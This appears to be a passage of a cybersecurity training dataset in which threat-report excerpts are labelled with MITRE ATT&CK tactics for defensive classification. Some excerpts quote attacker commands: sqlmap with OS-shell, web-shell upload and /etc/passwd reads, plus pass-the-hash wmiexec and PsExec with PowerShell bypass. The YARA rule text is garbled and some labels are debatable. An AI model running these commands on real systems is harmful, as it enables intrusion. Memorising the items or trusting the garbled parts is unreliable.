        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exploit public-facing application  T1190 \nA major question for an investigator is how the attackers penetrated the target system. At the penetration stage, APT41 threat actors used various techniques, including spear-phishing emails, exploiting a range of vulnerabilities (including Proxylogon), and watering hole and supply chain attacks. In the campaigns we analyzed, in some cases the threat actors penetrated target systems using SQL injections. Below we describe the commands used by APT41 in detail. Such attacks were carried out with the publicly available tool SQLmap, which the attackers used for multiple purposes. \nIn some organizations APT41 members gained access to the command shell of a target server and were able to execute certain commands. The group also used this tool to upload files to the target server. At this stage, the files were either Cobalt Strike Beacons or custom web shells. \nIn other cases, the threat actors gained access to databases with information about existing accounts, lists of employees, and plaintext and hashed passwords. \nNevertheless, the main tool that the attackers used in their campaigns was Cobalt Strike Beacon. \nSQLmap launched in various attacks: \npython sqlmap.py -r [Company1_domain].txt --tamper=space2comment --random-agent -p   \nctl00%24ContentPlaceHolder1%24txtUserName,ctl00%24ContentPlaceHolder1%24txtPassw   \n--os-shell python sqlmap.py -r [Company2_domain].txt -p   \n\"ctl00%24MainContent%24txtUserName,ctl00%24MainContent%24txtPassword\" --is-dba -   \nhex sqlmap.py -u [Company3_domain]/content.php?id=2141&sub=153 --random-agent --   \ntamper=space2comment --time-sec=10 --current-user python sqlmap.py -r   \n[Company4_domain] -p   \n\"ctl00%24ContentPlaceHolder1%24txtUserName,ctl00%24ContentPlaceHolder1%24txtPass   \n--file-write=\"/root/sqlmap/{Redacted_filename}.aspx\" --file-dest=\"   \n{Redacted_filepath}\\\\login1.aspx\" python sqlmap.py -u   \n\"http://[Company5_domain]/[redacted]/[redacted]/[redacted].php/?   \npage1=DM&page2=TOTAL_DATA_DOWNLOAD&page3=TOTAL_DATA_DOWNLOAD\" -p   \n\"page1\" --file-read \"/etc/passwd\" \nThe SQL injections enabled the threat actors to gain various levels of access to 43 out 86 websites they probed. The following diagrams were built based on sqlmap logs. According to this data, MySQL was installed on most of the compromised websites. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: UEFIis a specification that defines the architecture of the platform firmware used for booting the computer hardware and its interface for interaction with the operating system.\nFigure 6 reveals the different stages of the boot process in a UEFI system.\nIn the stages before boot device selection in Figure 6, the system's firmware is loaded from a Serial Peripheral Interface (SPI) flash memory. Then the EFI system partition (ESP), located in the boot device and containing the Windows Boot Manager, is loaded as the host boots into Windows.\nA malware implant in the ESP is enough to execute code before Windows starts, where it can easily disrupt various security mechanisms. Another possibility is an implant in the SPI flash memory that executes code at earlier stages of the boot process, enabling even greater power and flexibility. However, malware using a firmware implant in flash memory requires higher privileges than using an ESP implant. This is more complex.\nAs of 2023, only a handful of UEFI bootkits have been publicly reported in the wild, such asLoJax(a firmware implant) andBlackLotus(an ESP implant).",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Service execution was used several times to execute scripts and executables during lateral movement.\nWMI was used as well in an attempt to execute dlls laterally.\nThe threat actors also performed process injection.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This intrusion displayed numerous techniques used by threat actors to evade detection.\nProcess Injection\nThe adversary was seen injecting code into legitimate processes viaCreateRemoteThreadwhich can be detected using Sysmon event ID 8.\nThe table below shows examples of injected processes found via an in memory yara scan using thisMalpedia yara rule:\nFile Deletion\nFiles that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.\nBelow is the list of files seen being created and later deleted by the threat actor:\nRenamed System Utilities\nAdversaries typically rename common Windows system utilities to avoid triggering alerts that monitor utility usage. The table below summaries the renamed utilities observed in this intrusion.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).\nSubsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.\nUsing the YARA rule generated byMalpediawe were able to locate Cobalt Strike injections in the following processes.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BRONZE BUTLER typically creates a list of files (i.e., a shopping list) from compromised hosts and file-share servers. If the list is short, the group exfiltrates the files directly. For large lists, the threat actors use the following procedure: \n1. Use malware to upload the large list of enumerated files to the C2 server. \n2. Select specific files to steal, creating a new list. \n3. Use downloaders or other malware to send the new list to a compromised host. \n4. Use archiving software to collect files in a password-protected archive. \n5. Use an uploader or other malware to send the archived files to an attacker-controlled server. The uploader software is proprietary to this group, but Datper and xxmm also contain an uploading feature. When exfiltration is complete, the uploader (or Datper or xxmm) immediately uses the del command to delete the RAR archives. \nAR format for exfiltration. \nThe group uses a password to encrypt files for RAR archiving. CTU researchers have observed the following passwords used in BRONZE BUTLER network compromises: \n1234qwer   \n1234qwer!   \n1234\\$%qwer   \n1qazxsw2   \n1qazxcde32ws ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This intrusion is linked to an IcedID malspam campaign that was observed in October 2022 targeting Italian organizations based on overlap in the maldoc template and the IcedID C2 server.\nThis case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images embedded in the document, which caused the macros to execute when a user clicks on either of the images:\nThe macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload. More on this in the next section.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This dropper delivers multiple types of final payloads. As a result, we do not believe a single threat actor group uses this dropper. Instead, it is used as a tool that may be sold as a service to threat actors. We discovered that samples distributed at the beginning of 2023 contained the strings TicTacToe (Kolko_i_krzyzyk). Later campaigns had different unique strings common across the same campaigns but distributed different final-stage payloads. Some of the strings include: 'MatrixEqualityTestDetail,' 'QuanLyCafe,' 'Pizza_Project,' 'Kakurasu,' 'BanHang_1', 'ChiuMartSAIS,' etc. This indicates that the dropper tool is in constant development, and developers are trying to evade the string-based analysis of their malware dropper. By understanding the operation of this dropper and implementing solutions that can prevent its execution, organizations will be able to prevent the execution of a variety of final-stage payloads before they can be loaded.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although we do not know how the backdoor code made it into the library, from the recent campaigns, research indicates that the attackers might have compromised internal build or distribution systems of SolarWinds, embedding backdoor code into a legitimate SolarWinds library with the file name SolarWinds.Orion.Core.BusinessLayer.dll . This backdoor can be distributed via automatic update platforms or systems in target networks. Microsoft security researchers currently have limited information about how the attackers compromised these platforms. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We can see several local discovery commands executed from the PowerShell script.  They are looking for existing mining process on the machine, such askthreaddi,sysrv, etc. They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc.\nThis is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After web shell deployment, attackers typically ran an initial set of exploratory commands like whoami, ping, and net user. In most cases, the hijacked application pool services were running with system privileges, giving attackers the highest privilege. \nAttackers enumerated all local groups and members on the domain to identify targets. Interestingly, in some campaigns, attackers used open-source user group enumerating tools like lg.exe instead of the built-in net.exe. Attackers also used the EternalBlue exploit and nbtstat scanner to identify vulnerable machines on the network. \nCmd.exe /c cd /d c:\\PerfLogs\\&lg -lu&echo [S]&cd&echo[E] \nNext, the attackers ran built-in Exchange Management Shell cmdlets to gain more information about the exchange environment. Attackers used these cmdlets to perform the following: \nList all Exchange admin center virtual directories in client access services on all Mailbox servers in the network   \nGet a summary list of all the Exchange servers in the network   \nGet information on mailboxes, such as size and number of items, along with role assignments and permissions. \nName, InternalURL,ExternalURL\" powershell.exe -PSconsoleFile exshell.psc1 -Command \"Get-ManagementRoleAssignment -Role \" ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affiliates switching between different ransomware families like this is yet another attempt by ransomware actors to increase the chances of their attacks succeeding, and it will be interesting to see whether or not this is a tactic we start to increasingly observe during ransomware attacks.\nHaving access to multiple ransomware families increases the likelihood of affiliates being able to encrypt machines, increasing the dangers posed by these already dangerous attacks. This is just the latest development we have seen from ransomware actors, who are constantly refining their tactics in order to maximise their profits. The use of virtual machines was another example of attackers tweaking their approach in order to carry out a ransomware attack, while the emergence of double-extortion ransomware attacks last year, where attackers steal data and threaten to release it while also encrypting machines in ransomware attacks, led to one of the biggest shifts we saw in the ransomware landscape in recent times.\nThe surge in LockBit activity that we have seen also shows that while some big ransomware names have shut down their operations in recent times, there are many other ransomware operators waiting to fill the space that has been left.\nRansomware actors continue to change and refine their tactics in an effort to evade the security steps taken by organizations to stop these types of attacks, which is why ransomware remains one of the biggest threats on the cyber crime landscape in 2021.",
        "output": "impact",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Proofpoint has been tracking TA4557 since 2018 as a skilled, financially motivated threat actor known to distribute the exclusive more_eggs backdoor, which can profile the endpoint and send additional payloads. TA4557 notably differs from other priority threat actors due to the unique tool and malware usage, campaign targeting, job candidate-themed lures, sophisticated evasive measures, distinct attack chains, and notable infrastructure patterns.\nThroughout 2024, Proofpoint has observed TA4557 use multiple delivery approaches when targeting employees involved in the hiring process, including:\nSending emails directly to employees containing instructions guiding the recipient to navigate to a resume-themed website that ultimately leads to malware delivery. The actor used various methods to prevent security tools from recognizing the domain in the email body, seemingly to avoid automated analysis. Examples include leaving a space or underscore before the TLD in the email body. \nSending benign emails directly to employees, waiting for a response, then replying with an email containing instructions guiding the recipient to navigate to a resume-themed website that ultimately leads to malware delivery masquerading as a fake candidate and applying to legitimate job postings on various employment websites. The actor typically uploaded a resume to the job application containing instructions that guided users to a fake candidate web page. \nIn March 2024, Proofpoint observed the use of the third approach in an email from a job board notifying a user that a new candidate (TA4557) had applied to the user's open job posting. Our intrusion files and lure site matched this campaign.\nIn our intrusion, we were able to identify the origin of the malicious payload that was executed by parsing the user's Edge SQLite databases.\nThe user downloaded John Shimkus.zip from the domain johnshimkus[.]com. The site had a captcha when the Download CV button was clicked and regenerates a unique download URL when we attempted to analyze the site further.\nWhen visited from a Linux User Agent, the site returns a basic text resume instead of the download link in an attempt to avoid analysis.\nThe same website template and stock image was used in a TA4557 campaign thatProofpoint coveredbelow:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The created scheduled task runs PowerShell commands designed to exclude both the PowerShell process and the current directory from being scanned by Microsoft Defender for Endpoint. This action prevents subsequent PowerShell executions from being flagged, allowing the attack to continue undisturbed. ",
        "output": "defense evasion",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the second day of the intrusion, a connection from a file server began to the IP 139.60.160[.]166 over port 4433. The process tree indicates the FlawedGrace malware injected into svchost and msiexec on the file server and initiated the transfer.Other reportshave indicated Truebot/FlawedGrace intrusions have deployed custom tools for exfiltration. We did not observe any additional binary dropped to disk to perform the exfiltration. As the FlawedGrace process established the TCP connection, we assess with moderate confidence the capability was included in the FlawedGrace malware itself.\nTwo distinct exfiltration periods were observed taking place around two hours apart.\nThe network traffic was not sent over a TLS connection but just the TCP protocol.\nThis data was not observable in plain text, indicating likely other obfuscation/encryption methods in use. Using flow data between the two sessions, we were able to verify gigabytes of data were exfiltrated.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We found out that we had all the ML models that have been deployed to endpoints. So at the beginning, we had all the images of the models, and now we also had all the ML models.\nEven more alarmingly, we discovered adapter files within these buckets as Figure 27 below shows. These adapter files are critical components of the fine-tuning process for LLM models, and they contain the weights that directly alter the behavior of the base model.\nAlthough the name of the example in Figure 27 isadapter.txt, the content is not readable text. However, the content of these adapter files contains weights representing highly sensitive, proprietary data, which makes them an invaluable target for attackers.\nIn summary, by deploying a malicious model, we were able to access resources in the tenant projects that allowed us to view and export all models deployed across the project. This includes both ML and LLM models, along with their fine-tuned adapters.\nThis method presents a clear risk for a model-to-model infection scenario. For example, your team could unknowingly deploy a malicious model uploaded to a public repository. Once active, it could exfiltrate all ML and fine-tuned LLM models in the project, putting your most sensitive assets at risk.\nThe flow diagram in Figure 28 shows an example of this model infection attack using the following steps:\nPoisoned model is prepared and uploaded to a public repository \nData engineer downloads and imports the model \nThe model is deployed, granting access to the attacker \nThe attacker downloads the model images \nThe attacker downloads the trained models and LLM adapter layers",
        "output": "impact",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Command-line interface   \nWindows Management Instrumentation   \nPowerShell ",
        "output": "execution",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process Injection\nAs observed in nearly all intrusions, process injection was leveraged to masquerade the real origin of malicious actions. Depending on the employed techniques, multiple artifact combinations are available in the logs such as Sysmon's:\nevent10(process accessed), common for injecting into existing processes. \nevent8(remote thread created). \nevent1(process created), or alternatively Security event4688, to identify improbable processes such as the often abused defaultrundll32.exe.\nAs widely documented in our \"Cobalt Strike, a Defender's Guide\" series, evidence of process injection can be supported by the later creation of post-exploitation (\\postex_*) named-pipes (Sysmon event17and18).\nIn-memory, YARA scans conducted during the intrusion using the win_cobalt_strike_auto rule fromMalpediashowed some of the various injections performed.\nArtifact Removal\nThroughout the intrusion, the threat actor covered their traces by deleting useful artifacts. As outlined by Sysmon's event23(file delete), some actions were as expected, taken automatically by both stagers and RMM utilities.\nProcess execution logs, however, highlighted some of the manual deletions performed by the threat actor, either through native actions, (e.g. thedelcommand) as well as through their attacker tools (e.g. usingrclone configto erase attacker credentials).",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID created a DLL named Utucka.dll just after the initial execution.\nA scheduled task was then created using this same DLL.\nFirst execution was observed on Day 1 at 8:00 PM and was repeated every hour.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On July 23 and 25, 2022, MERCURY was observed using exploits against vulnerable SysAid Server instances as its initial access vector. Based on observations from past campaigns and vulnerabilities found in target environments, Microsoft assess that the exploits used were most likely related to Log4j 2. The threat actor leveraged Log4j 2 exploits against VMware applications earlier in 2022 and likely looked for \nMERCURY leveraging Log4j 2 vulnerabilities in unpatched systems to target Israeli organizations | Microsoft Security Blog similarly vulnerable internet-facing apps. SysAid, which provides IT management tools, might have presented as an attractive target for its presence in the targeted country. \nExploiting SysAid successfully enables the threat actor to drop and leverage web shells to execute several commands, as listed below. Most commands are related to reconnaissance, with one encoded PowerShell that downloads the actor's tool for lateral movement and persistence. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: more_eggs\nDuring the initial more_eggs execution a scheduled task command was run:\nThe schtasks command was run with the /XML flag pointing to a text file dropped by the threat actor. This flag according to theMicrosoft documentation:\nSo while using a text extension, the file was a ready made task for persistence. The task itself used a Boot Trigger to restart the malware after restart activity on the host.\nThe command arguments in the task pointed to a file on disk 178F2E426.txt containing:\nWhen decoded we can see the script would result in the execution of msxsl.exe and the more_eggs script files disguised as text files.\nCloudflared\nOn a backup server the threat actor downloaded a zip file named cloudflared.zip from the temp.sh file sharing site using Internet Explorer. We can see the internet explorer process write the file and extract the download url from the WebCacheV01.dat file for the user.\nThe threat actor then installed the toolCloudflaredthrough the MSI installer on two hosts in the environment. Cloudflared is a tool that can be used to tunnel traffic through Cloudflare's services. This allows the threat actor to proxy access to the private network through the tunnel.\nThe MSI and subsequent command would install the service (System EID 7045) as Cloudflared agent with the start type of auto start. This would allow persistent access through the tunnel established by the agent.\nInstallation of the CloudFlared results in Cloudflared Windows Events being logged in the Application log. The events indicating the Cloudflared service starting and the tunnel being established were recorded as Event ID 1  Cloudflared.\nFollowed by tunnel establishment:\nCreate Accounts\nDuring the intrusion the threat actor created four different user accounts. Three were local users and added to the host's local Administrators group with a final user account being added to the domain and domain Administrators group. All of the users were added using net.exe but the commands were initiated via a variety of ways including local command shells, application exploits, and remote services.\nUser names observed during the intrusion:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As described in the Overview section of this blogpost, the fake Shagle app has been hosted at the Shagle copycat website, from which victims had to choose to download and install the app. There was no subterfuge suggesting the app was available from Google Play and we do not know how potential victims were lured to, or otherwise discovered, the fake website.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor used various means to execute malicious files. While they created scheduled tasks on several hosts with a means to maintain persistence, they also manually ran many of these to execute the various malicious proxy tools like SystemBC and GhostSOCKS.\nService execution was also widely used and is discussed in depth in the lateral movement section. Other observed execution patterns relied on WMI, batch scripts and Psexec which are covered in other sections specific to their use.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1562.001 Impair Defenses: Disable or Modify Tools\nVarious commands were captured in the Meterpreter history disabling Microsoft Defender:\nT1036 Masquerading\nT1036.004 Masquerade Task or Service\nThe threat actor used various masquerading naming conventions to try and blend-in on systems to which they gained access. These techniques were applied to Silver beacons, naming of tasks, and service names.\nMasquerading beacon examples:\nMasquerading service example:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Rather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and publicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other cyber actors, which can lead to misattribution. \nUnit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this has provided the opportunity to obtain various hacker tools such as malware and malware loaders [T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical analysis can be found in Appendix A: WhisperGate Malware Analysis. ",
        "output": "other",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: Command and Scripting Interpreter: Windows Command Shell (T1059.00   \nATT&CK Technique: Command and Scripting Interpreter: PowerShell (T1059.001)   \nATT&CK Technique: Windows Management Instrumentation (T1047)   \nATT&CK Technique: System Services: Service Execution (T1569.002) \nSimilar to what was observed during the post-compromise reconnaissance phase of the attack, the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment. The attacker also used the \"proxychains\" utility, which is often employed to redirect network traffic during penetration testing, red teaming, and other offensive operations. \ncmd.exe /q /c proxychains \\~/impacket/examples/wmiexec.py -hashes [SHA256   \nHASH] [USERNAME]@[IP ADDRESS] 1> \\\\127.0.0.1\\admin\\$\\__[STRING] 2>&1 \nWe also observed the adversary using Windows Batch files to execute PSExec. In this case, PSExec remotely authenticated and executed PowerShell on remote systems within the environment. \ncmd.exe /c C:\\s\\$\\0.bat PsExec.exe -d \\\\[HOSTNAME] -u [DOMAIN]\\[USERNAME] - p [PASSWORD] -accepteula -s cmd /c powershell.exe -ExecutionPolicy Bypass file \\\\[HOSTNAME]\\s\\$\\p.ps1 \nThere were also artifacts in the environment that indicate that the recently disclosed PrintNightmare vulnerability may have been used during this attack. A DLL associated with PrintNightmare was observed on systems within the environment as described in the section \"Credential Access.\" ",
        "output": "execution",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Registry Run Key\nTo ensure persistent access to the environment, the threat actor created a run key named \"socks5\" within the Current User registry hive. The registry key's configuration indicated that PowerShell would be used to launch a SystemBC backdoor named socks32.exe.\nSysmon eventID 13 (Registry value set) shows changes to a registry key value:\nOne interesting thing to mention is that the registry value namesocks5created under theRunkey is hard coded.\nThe data is a string (typeREG_SZ) which starts withpowershell.exe windowstyle -hidden Commandconcatenated with the current executable name, which is obtained usingGetModuleFileNameAwith a nullhModulefirst parameter.\nScheduled Task\nSystemBC possesses the ability to create scheduled tasks using COM, as demonstrated in the following example. Whileother reportshave noted SystemBC utilizing this feature, it likely wasn't employed in our case, as no evidence of scheduled task creation was observed during our investigation.\nIt first uses the functionCoCreateInstanceto create an instance of anITaskSchedulerobject and then call the methodNewWorkItemto create a scheduled task.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: WMI\nThreat actors used wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers. The payloads were stored on textbin[.]net.\nAs we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.\nRemote Desktop Protocol\nThe beacon C:\\ProgramData\\lsass.exe was used to proxy RDP connections and connect to another computer.\nProxying RDP traffic via a process such as a Cobalt Strike beacon reduces the exposure of the threat actor's own infrastructure, and blends RDP activity to those of internal hosts on the network.\nThe use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone).\nThe common processes observed were two injected processes, and the Nigu.exe/lsass.exe.\nThese processes are unusual for establishing RDP connections. During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts. An example would be pon.txt. This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon:\npon.txt contents:\nRemote Service\nRemote services were also created in order to propagate Cobalt Strike beacons in the network.\nAnyDesk\nAnyDesk was used to move laterally between a workstation and a backup server as shown below with Sysmon event 3 (Network connection):",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1133: External Remote Services T1199: Trusted Relationship T1566: Phishing T1566.001: Spearphishing Attachment T1566.002: Spearphishing Link ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1003.001: LSASS MemoryT1003.002: Security Account ManagerT1552.002: Credentials in RegistryT1558: Steal or Forge Kerberos TicketsT1558.003: Kerberoasting \nInitial Access \nT1133: External Remote ServicesT1189: Drive-by Compromise \nResource Development \nT1588.003: Code Signing CertificatesT1588.004: Digital CertificatesT1608.003: Install Digital Certificate \nLOCKBIT YARA Rules \nThe following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of \nTo HADES and Back: UNC2165 Shifts to LOCKBIT to Evade Sanctions | Mandiant | Google false positives. These rules are intended to serve as a starting point for hunting efforts to identify LOCKBIT activity; however, they may need adjustment over time if the malware family changes. \nrule LOCKBIT_Note_PE_v1   \n{ strings: \\$onion $=$ /http:\\/\\/lockbit[a-z0-9] \\$note1 $=$ \"restore-my-files.txt\" no $\\$100t e2$ (ransomware|n $\\$12$ \"LockBit_2_0_Ransom\" nocase condition: $(\\mathrm{uint16}(\\theta)=\\theta{\\times}5\\mathrm{A}4\\mathrm{D})$ and (uint32( and $\\$1$ onion and (all of (\\$note\\*)) and not $\\$12$   \nrule LOCKBIT_Note_PE_v2   \n{ strings: \\$onion $=$ /http:\\/\\/lockbit[a-z0-9] $\\$100$ $=$ \"restore-my-files.txt\" noc $\\$100t e2$ (ransomware|n $\\$12$ \"LockBit_2_0_Ransom\" nocase condition: (uint16(0) $==$ 0x5A4D) and (uint32(   \n} \nTo HADES and Back: UNC2165 Shifts to LOCKBIT to Evade Sanctions | Mandiant | Google Cloud Blog Figure 10: LOCKBIT YARA rule detects PE files with strings related to LOCKBIT 2.0 ransom notes \nPosted in Threat Intelligence-Security & Identity ",
        "output": "credential access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once Flax Typhoon becomes established on the target system, Microsoft observes the actor conducting credential access activities using common tools and techniques. Most commonly, Flax Typhoon targets the Local Security Authority Subsystem Service (LSASS) process memory and Security Account Manager (SAM) registry hive. Both stores contain hashed passwords for users signed into the local system. Flax Typhoon frequently deploys Mimikatz, a publicly available malware that can automatically dump these stores when improperly secured. The resulting password hashes can be cracked offline or used in pass-the-hash (PtH) attacks to access other resources on the compromised network. \nFlax Typhoon also enumerates restore points used by System Restore. Restore points contain data about the Windows operating system that the system owner can use to revert changes to the system if it becomes inoperable, rather than a backup of user data. Flax Typhoon could use this information to better understand the compromised system or as a template for removing indicators of malicious activity. \nThis pattern of activity is unusual in that minimal activity occurs after the actor establishes persistence. Flax Typhoon's discovery and credential access activities do not appear to enable further data-collection and exfiltration objectives. While the actor's observed behavior suggests Flax Typhoon intents to perform espionage and maintain their network footholds, Microsoft has not observed Flax Typhoon act on final objectives in this campaign. ",
        "output": "credential access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon exploiting the Exchange vulnerability, the attackers launched the following discovery commands to gather information about the device they had compromised: \ncmd.exe and the commands ver and systeminfo  to collect operating system information net.exe  to determine domain computers, domain controllers, and domain admins in the environment \nAfter executing these commands, the attackers navigated through directories and discovered a passwords folder that granted them access to account credentials they could use in the subsequent stages of the attack. They also used the del command to delete files related to their initial compromise activity. \nThe attackers then mounted a network share using net use and the stolen credentials and began looking for potential lateral movement targets using a combination of methods. First, they used WMIC.exe using the previously gathered device name as the node, launched the command whoami /all, and pinged google.com to check network connectivity. The output of the results were then written to a .log file on the mounted share. Second, the attackers used PowerShell.exe with the cmdlet Get-ADComputer and a filter to gather the last signin event. ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors want to elevate their privileges to follow through on their objectives. One technique used is Cobalt Strike's \"GetSystem\" functionality to achieve SYSTEM privileges.\nThere is a great article fromRed Canarywhich talks about this functionality present in various offensive tools and hunting tips.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
